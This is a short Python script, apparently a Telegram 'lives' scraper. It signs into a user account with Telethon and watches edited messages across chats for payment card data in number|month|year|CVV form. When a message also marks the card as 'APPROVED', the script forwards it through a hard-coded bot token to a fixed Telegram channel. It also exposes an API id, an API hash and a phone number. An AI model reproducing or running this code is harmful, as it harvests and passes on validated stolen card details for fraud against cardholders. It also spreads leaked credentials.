from telethon.sync import TelegramClient, events
from telethon.errors.rpcerrorlist import PhoneNumberBannedError
import re, requests, random

api_url = 'https://api.telegram.org/bot6061717387:AAH56TksIiuDxqnFJxIM8H1rDefAFQ6pRz0/sendMessage'
number = '+529211772365'
client = TelegramClient(f'SCRAPPER FULL LIVES',24490059,'65faeb72c788047746f8f06bddc9b838')
client.start(number)

# -- approved list --
approved = ['𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅'        ,'APPROVED','𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫'        ]

# -- declined --
declined = ['ERROR','DECLINED','𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫'        ]

@client.on(events.MessageEdited())
async def handler(event):
    if event.is_private:
        chat_name = 'Chat privado'
    elif event.is_group:
        chat_name = 'Grupo: {}'.format(event.chat.title)
    else:
        chat_name = 'Canal: {}'.format(event.chat.title)

    message_get = event.message.message.upper()
    print(message_get)
    regex = r'\d{14,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}'
    message_gei = re.sub(regex,r'<code>\g<0></code>',message_get)
    payload = {
        'chat_id': '-1001638897105',
        'text': message_gei,
        'parse_mode': 'HTML'
    }

    if(re.search(regex, message_get) and any(live in message_get for live in approved) == True):
        payload['chat_id'] = '-1001638897105'
        requests.post(api_url,data=payload).text
        if(random.randint(0,10) == 10):
            payload['chat_id'] = ''
            requests.post(api_url,data=payload).text

client.run_until_disconnected()